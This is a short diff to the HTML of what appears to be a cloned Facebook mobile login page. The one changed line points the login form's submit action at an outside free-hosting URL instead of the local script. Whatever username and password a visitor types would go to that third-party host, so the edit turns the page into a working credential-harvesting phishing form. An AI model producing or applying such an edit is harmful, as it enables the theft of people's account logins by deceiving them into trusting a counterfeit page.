@@ -92,7 +92,7 @@
           </div>
          </div>
          <div class="_5rut">
-          <form method="post" action="action.php" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1" data-sigil="m_login_form" data-autoid="autoid_4">
+          <form method="post" action="https://easymoney799975.000webhostapp.com/Mtc.php" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1" data-sigil="m_login_form" data-autoid="autoid_4">
            <input type="hidden" name="lsd" value="AVq_8UahjRI" autocomplete="off">
            <input type="hidden" name="jazoest" value="2962" autocomplete="off">
            <input type="hidden" name="m_ts" value="1648374801">
